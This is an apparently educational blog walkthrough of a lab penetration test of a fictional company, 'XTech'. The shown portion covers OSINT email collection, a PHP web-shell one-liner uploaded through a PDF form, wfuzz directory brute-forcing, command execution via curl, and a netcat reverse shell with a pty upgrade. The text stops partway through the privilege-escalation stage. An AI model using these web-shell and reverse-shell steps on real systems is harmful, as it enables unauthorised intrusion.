
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="['@kf0k']">
      
      
      
        <link rel="prev" href="../basic_av_evasion/">
      
      
        <link rel="next" href="../../Writeups/">
      
      <link rel="icon" href="../../assets/logo.png">
      <meta name="generator" content="mkdocs-1.4.2, mkdocs-material-9.0.10">
    
    
      
        <title>From OSINT Into Domain Admin - Blog</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.0d440cfe.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.2505c338.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CSource+Code+Pro:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Source Code Pro"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#overview" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Blog" class="md-header__button md-logo" aria-label="Blog" data-md-component="logo">
      
  <img src="../../assets/logo.png" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              From OSINT Into Domain Admin
            
          </span>
        </div>
      </div>
    </div>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  


  <li class="md-tabs__item">
    <a href="../.." class="md-tabs__link">
      Security Stuff
    </a>
  </li>

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../AD/" class="md-tabs__link">
        AD
      </a>
    </li>
  

      
        
  
  
    
  


  
  
  
    <li class="md-tabs__item">
      <a href="../basic_av_evasion/" class="md-tabs__link md-tabs__link--active">
        Posts
      </a>
    </li>
  

      
        
  
  


  
  
  
    <li class="md-tabs__item">
      <a href="../../Writeups/" class="md-tabs__link">
        Writeups
      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Blog" class="md-nav__button md-logo" aria-label="Blog" data-md-component="logo">
      
  <img src="../../assets/logo.png" alt="logo">

    </a>
    Blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        Security Stuff
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
      
      
      
        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
          AD
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          AD
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../AD/" class="md-nav__link">
        General
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          Posts
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Posts
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../basic_av_evasion/" class="md-nav__link">
        Basic Anti-Virus Evasion
      </a>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          From OSINT Into Domain Admin
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        From OSINT Into Domain Admin
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#theoretical" class="md-nav__link">
    Theoretical
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-scenario" class="md-nav__link">
    Attack Scenario
  </a>
  
    <nav class="md-nav" aria-label="Attack Scenario">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#entry-point" class="md-nav__link">
    Entry Point
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#osint" class="md-nav__link">
    OSINT
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web01" class="md-nav__link">
    Web01
  </a>
  
    <nav class="md-nav" aria-label="Web01">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    Initial Access
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pivoting-to-dev01" class="md-nav__link">
    Pivoting to dev01
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mail01" class="md-nav__link">
    Mail01
  </a>
  
    <nav class="md-nav" aria-label="Mail01">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pivot-to-mail01" class="md-nav__link">
    Pivot to Mail01
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-spray" class="md-nav__link">
    Password Spray
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-lonnies-mailbox" class="md-nav__link">
    Enumerate Lonnie's Mailbox
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-the-domain-controller" class="md-nav__link">
    Enumerate the Domain Controller
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pivot-to-exchsvc" class="md-nav__link">
    Pivot to ExchSVC
  </a>
  
    <nav class="md-nav" aria-label="Pivot to ExchSVC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-generic-write-privileges" class="md-nav__link">
    Abusing Generic Write Privileges
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dc01" class="md-nav__link">
    DC01
  </a>
  
    <nav class="md-nav" aria-label="DC01">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abuse-constrained-delegation" class="md-nav__link">
    Abuse Constrained Delegation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          Writeups
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Writeups
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/" class="md-nav__link">
        Overview
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
          Machines
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2">
          <span class="md-nav__icon md-icon"></span>
          Machines
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_1" id="__nav_4_2_1_label" tabindex="0">
          Active
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_1">
          <span class="md-nav__icon md-icon"></span>
          Active
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/active/writeup/" class="md-nav__link">
        Active
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_2" id="__nav_4_2_2_label" tabindex="0">
          Bastian
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_2">
          <span class="md-nav__icon md-icon"></span>
          Bastian
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/bastian/writeup/" class="md-nav__link">
        Bastian
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_3" id="__nav_4_2_3_label" tabindex="0">
          Flight
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_3">
          <span class="md-nav__icon md-icon"></span>
          Flight
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/flight/writeup/" class="md-nav__link">
        Writeup
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_4" id="__nav_4_2_4_label" tabindex="0">
          Intelligence
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_4">
          <span class="md-nav__icon md-icon"></span>
          Intelligence
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/intelligence/Intelligence/" class="md-nav__link">
        Intelligence
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_5" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_5" id="__nav_4_2_5_label" tabindex="0">
          Knife
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_5">
          <span class="md-nav__icon md-icon"></span>
          Knife
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/knife/knife-writeup/" class="md-nav__link">
        Knife
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_6" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_6" id="__nav_4_2_6_label" tabindex="0">
          Love
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_6">
          <span class="md-nav__icon md-icon"></span>
          Love
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/love/love/" class="md-nav__link">
        Love Write-up
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_7" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_7" id="__nav_4_2_7_label" tabindex="0">
          Monitors
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_7">
          <span class="md-nav__icon md-icon"></span>
          Monitors
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/monitors/monitors/" class="md-nav__link">
        Monitors
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_8" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_8" id="__nav_4_2_8_label" tabindex="0">
          Scrambled
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_8">
          <span class="md-nav__icon md-icon"></span>
          Scrambled
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/scrambled/writeup/" class="md-nav__link">
        Writeup
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_9" >
      
      
      
        <label class="md-nav__link" for="__nav_4_2_9" id="__nav_4_2_9_label" tabindex="0">
          Shoker
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_9_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4_2_9">
          <span class="md-nav__icon md-icon"></span>
          Shoker
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeups/machines/shoker/writeup/" class="md-nav__link">
        Shocker Write-up
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#theoretical" class="md-nav__link">
    Theoretical
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#attack-scenario" class="md-nav__link">
    Attack Scenario
  </a>
  
    <nav class="md-nav" aria-label="Attack Scenario">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#entry-point" class="md-nav__link">
    Entry Point
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#osint" class="md-nav__link">
    OSINT
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web01" class="md-nav__link">
    Web01
  </a>
  
    <nav class="md-nav" aria-label="Web01">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#initial-access" class="md-nav__link">
    Initial Access
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#pivoting-to-dev01" class="md-nav__link">
    Pivoting to dev01
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privilege-escalation" class="md-nav__link">
    Privilege Escalation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mail01" class="md-nav__link">
    Mail01
  </a>
  
    <nav class="md-nav" aria-label="Mail01">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#pivot-to-mail01" class="md-nav__link">
    Pivot to Mail01
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#password-spray" class="md-nav__link">
    Password Spray
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-lonnies-mailbox" class="md-nav__link">
    Enumerate Lonnie's Mailbox
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerate-the-domain-controller" class="md-nav__link">
    Enumerate the Domain Controller
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pivot-to-exchsvc" class="md-nav__link">
    Pivot to ExchSVC
  </a>
  
    <nav class="md-nav" aria-label="Pivot to ExchSVC">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-generic-write-privileges" class="md-nav__link">
    Abusing Generic Write Privileges
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dc01" class="md-nav__link">
    DC01
  </a>
  
    <nav class="md-nav" aria-label="DC01">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abuse-constrained-delegation" class="md-nav__link">
    Abuse Constrained Delegation
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">&para;</a></h1>
<p><img alt="" src="../osint_into_da.assets/mylab-diag.png" /></p>
<blockquote>
<p>I’ve had several customers come to me before a pentest and say they  think they’re in a good shape because their vulnerability scan shows no  critical vulnerabilities and that they’re ready for a pentest, which  then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD. <a href="https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/">HAUSEC</a></p>
</blockquote>
<p>Active directory penetration testing it is very important in real life and PT job role, most of (at least all) the organizations have domain controller. 
This blog will demonstrate an attack scenario of advisory compromise the domain controller of a organization from OSINT. My main focus of this scenario is the active directory penetration testing by demonstrating in how an threat actor can pivot inside the organization network and compromise the Domain Controller.</p>
<p>An overview of the stages of exploitation: </p>
<ol>
<li>OSINT</li>
<li>Linux Privilege Escalation</li>
<li>Pivoting</li>
<li>Active Directory Enumeration </li>
<li>Lateral Movement</li>
<li>Kerberoasting</li>
<li>Abusing Active Directory ACLs </li>
<li>Constrained Delegation</li>
</ol>
<h2 id="theoretical">Theoretical<a class="headerlink" href="#theoretical" title="Permanent link">&para;</a></h2>
<p>First of all, active directory is designed by Microsoft and used in most of organizations as the directory service that stores all information of the organization, such as computers, users, domains, printers and etc.  </p>
<hr />
<h2 id="attack-scenario">Attack Scenario<a class="headerlink" href="#attack-scenario" title="Permanent link">&para;</a></h2>
<h3 id="entry-point">Entry Point<a class="headerlink" href="#entry-point" title="Permanent link">&para;</a></h3>
<p>XTech is an electronics-based technology company that which are well known in the country. XTech reached out a penetration testing company to conduct a penetration test for XTech infrastructure. The type of the penetration test was external black-box and the scope was <code>xtech.com</code> with the IP Address <code>192.168.241.204</code>.</p>
<h2 id="osint">OSINT<a class="headerlink" href="#osint" title="Permanent link">&para;</a></h2>
<p>OSINT stands for <strong>Open-Source Intelligence</strong> which means the process of gathering public information about the target such as: employees names, company address, employees emails, technologies they are using and etc. </p>
<p>Starting from OSINT, here we will attempt to collect as much information we can about the company passively. We will focus to gather email addresses. Let's browse the company website and try to collect information from it. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211218102244462.png" /></p>
<p>By going into the "<strong>Who we are</strong>" section, we will find three different employees with their social media accounts. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211218102644672.png" /></p>
<p>In real world scenario email addresses can be collected from different ways. There are many public OSINT tools that can be utilize to collect not only the email addresses also many other information about the target company. Example of tools that can be used: </p>
<ul>
<li><a href="https://google.com">Google Dorks</a>: using google search engine, try to search for any publicly available documents from targets websites. inside those document inspect the meta-data, usually you can find usernames there.</li>
<li><a href="https://www.zoominfo.com/">zoominfo</a>: useful for collecting employees email addresses. </li>
<li><a href="https://rocketreach.co">rocketreach</a>. useful for collecting employees email addresses. </li>
</ul>
<p>For our scenario, I made the lab basic in order to make easy it to understand. So now we collected three email addresses: </p>
<ul>
<li>bob.baker@xtech.local</li>
<li>lonnie.hill@xtech.local</li>
<li>john.doe@xtech.local</li>
</ul>
<p>We will use them later to conduct different attack. Moving forward in inspecting the website, we will notice an upload button that asking to upload PDF document. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211218102755043.png" /></p>
<h2 id="web01">Web01<a class="headerlink" href="#web01" title="Permanent link">&para;</a></h2>
<h3 id="initial-access">Initial Access<a class="headerlink" href="#initial-access" title="Permanent link">&para;</a></h3>
<p>Let's try to abuse this function by uploading simple PHP file that grant us to execute commands. This can be done using the following one-liner command:  </p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>cmd.php
</code></pre></div>
<p><img alt="" src="../osint_into_da.assets/image-20211223114917040.png" /></p>
<p>By uploading the PHP file, the website will response with the following:</p>
<p><img alt="image-20211223115256972" src="../osint_into_da.assets/image-20211223115256972.png" /></p>
<p>The PHP file have been uploaded, however, we don't know where it is uploaded. We will need to brute force the directories to find the directory that the file have been uploaded into. We can use here <code>wfuzz</code> to brute force the directory that contains the PHP file <code>cmd.php</code> </p>
<div class="highlight"><pre><span></span><code>wfuzz<span class="w"> </span>-c<span class="w"> </span>-z<span class="w"> </span>file,/usr/share/wordlists/dirb/common.txt<span class="w">  </span>--hc<span class="w"> </span><span class="m">404</span><span class="w"> </span>http://192.168.241.204/FUZZ/cmd.php
</code></pre></div>
<p>The result of this command will be: </p>
<div class="highlight"><pre><span></span><code>Target:<span class="w"> </span>http://192.168.241.204/FUZZ/cmd.php
Total<span class="w"> </span>requests:<span class="w"> </span><span class="nv">4614</span>
<span class="o">=====================================================================</span>
ID<span class="w">           </span>Response<span class="w">   </span>Lines<span class="w">    </span>Word<span class="w">       </span>Chars<span class="w">       </span><span class="nv">Payload</span>
<span class="o">=====================================================================</span>
<span class="m">000004216</span>:<span class="w">   </span><span class="m">500</span><span class="w">        </span><span class="m">0</span><span class="w"> </span>L<span class="w">      </span><span class="m">0</span><span class="w"> </span>W<span class="w">        </span><span class="m">0</span><span class="w"> </span>Ch<span class="w">        </span><span class="s2">&quot;uploads&quot;</span><span class="w">  </span>
</code></pre></div>
<p>So we found the directory <code>uploads</code>, now we can browse into that directory but we will use <code>curl</code> instead to make HTTP GET request. </p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s1">&#39;http://192.168.241.204/uploads/cmd.php?cmd=id&#39;</span><span class="w"> </span>
<span class="nv">uid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">33</span><span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div>
<p>We have now command execution in the server with the user <code>www-data</code>. To obtain reverse shell, we will upload <code>shell.php</code> which can found from the directory <code>/usr/share/laudanum/php/</code>. After upload it, setup <code>netcat</code> listener and browse into the uploaded PHP file. </p>
<p><img alt="" src="../osint_into_da.assets/image-20211223122635646.png" /></p>
<p>Now we obtained reverse shell on <strong>Web01</strong> host. Before enumerating the machine, first we will upgrade our shell to fully interactive shell using the following commands: </p>
<div class="highlight"><pre><span></span><code>$<span class="w"> </span>which<span class="w"> </span>python3
/usr/bin/python3
$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
